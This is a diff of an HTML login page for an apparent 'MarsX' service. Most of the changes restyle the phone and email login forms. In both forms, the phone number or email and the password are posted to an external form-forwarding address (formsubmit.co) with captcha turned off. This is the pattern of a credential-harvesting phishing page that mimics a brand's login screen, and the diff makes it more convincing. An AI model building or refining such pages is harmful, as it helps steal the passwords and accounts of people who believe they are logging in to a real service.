@@ -24,6 +24,12 @@
       padding: 30px 20px;
     }
 
+    h1 {
+      font-size: 24px;
+      color: white;
+      margin-bottom: 20px;
+    }
+
     .logo {
       margin-bottom: 10px;
     }
@@ -70,63 +76,42 @@
       align-items: stretch;
     }
 
-    /* ✅ Nouveau style du champ téléphone */
-    .phone-input {
+    label {
+      text-align: left;
+      font-size: 12px;
+      margin-bottom: 5px;
+    }
+
+    .phone-input,
+    .input-wrapper {
       display: flex;
       align-items: center;
-      background-color: #2a2a2a;
+      background-color: #222;
       border-radius: 30px;
       padding: 0 15px;
       margin-bottom: 20px;
-      height: 48px;
+      height: 50px;
     }
 
-    .phone-input input {
+    .phone-input img {
+      width: 20px;
+      margin-right: 8px;
+    }
+
+    .phone-input select,
+    .phone-input input,
+    .input-wrapper input {
       background: transparent;
       border: none;
       color: white;
-      padding-left: 10px;
+      padding: 12px 5px;
       font-size: 16px;
       flex: 1;
       outline: none;
     }
 
-    .phone-prefix {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .phone-prefix img {
-      width: 22px;
-      height: 22px;
-      border-radius: 50%;
-    }
-
-    .phone-prefix .dial-code {
-      font-size: 16px;
-      color: white;
-    }
-
-    .phone-prefix .arrow {
-      font-size: 14px;
-      color: white;
-    }
-
     .input-wrapper {
       position: relative;
-      margin-bottom: 20px;
-    }
-
-    .input-wrapper input {
-      width: 100%;
-      padding: 12px;
-      border-radius: 10px;
-      border: none;
-      outline: none;
-      background-color: #222;
-      color: white;
-      font-size: 16px;
     }
 
     .input-wrapper .toggle-password {
@@ -135,21 +120,23 @@
       top: 50%;
       transform: translateY(-50%);
       cursor: pointer;
+      font-size: 18px;
       color: #999;
     }
 
     .options {
       display: flex;
-      justify-content: space-between;
-      align-items: center;
+      flex-direction: column;
+      align-items: flex-start;
       font-size: 14px;
       color: #ccc;
       margin-bottom: 20px;
     }
 
     .options a {
-      color: #d4af37;
+      color: white;
       text-decoration: none;
+      margin-bottom: 10px;
     }
 
     .remember-me {
@@ -207,12 +194,12 @@
   </style>
 </head>
 <body>
+  <h1>Log In</h1>
+
   <div class="container">
     <div class="logo">
       <img src="https://i.imgur.com/KZsmUi2.png" alt="MarsX Logo" />
     </div>
-
-    <h2>Welcome To Login</h2>
 
     <div class="tabs">
       <div class="tab active" onclick="switchTab('phone')">Phone Login</div>
@@ -223,20 +210,19 @@
     <form class="form-section active" id="phone-form" action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST" onsubmit="return handleSubmit();">
       <input type="hidden" name="_captcha" value="false">
 
-      <label style="text-align: left; font-size: 12px; margin-bottom: 5px;">Phone Number</label>
+      <label>Phone Number</label>
       <div class="phone-input">
-        <div class="phone-prefix">
-          <img src="https://flagcdn.com/us.svg" alt="US Flag" />
-          <span class="dial-code">+1</span>
-          <span class="arrow">▾</span>
-        </div>
+        <img src="https://flagcdn.com/us.svg" alt="US Flag">
+        <select name="country_code" style="width: 60px;">
+          <option value="+1">+1</option>
+        </select>
         <input type="text" name="phone_number" placeholder="Phone Number" required />
       </div>
 
-      <label style="text-align: left; font-size: 12px; margin-bottom: 5px;">Password</label>
+      <label>Password</label>
       <div class="input-wrapper">
         <input type="password" id="phone-password" name="password" placeholder="Password" required />
-        <span class="toggle-password" onclick="togglePassword('phone-password')">👁️</span>
+        <span class="toggle-password" onclick="togglePassword('phone-password')">👁</span>
       </div>
 
       <div class="options">
@@ -255,15 +241,15 @@
     <form class="form-section" id="email-form" action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST" onsubmit="return handleSubmit();">
       <input type="hidden" name="_captcha" value="false">
 
-      <label style="text-align: left; font-size: 12px; margin-bottom: 5px;">Email</label>
+      <label>Email</label>
       <div class="input-wrapper">
         <input type="email" name="email" placeholder="Email" required />
       </div>
 
-      <label style="text-align: left; font-size: 12px; margin-bottom: 5px;">Password</label>
+      <label>Password</label>
       <div class="input-wrapper">
         <input type="password" id="email-password" name="password" placeholder="Password" required />
-        <span class="toggle-password" onclick="togglePassword('email-password')">👁️</span>
+        <span class="toggle-password" onclick="togglePassword('email-password')">👁</span>
       </div>
 
       <div class="options">
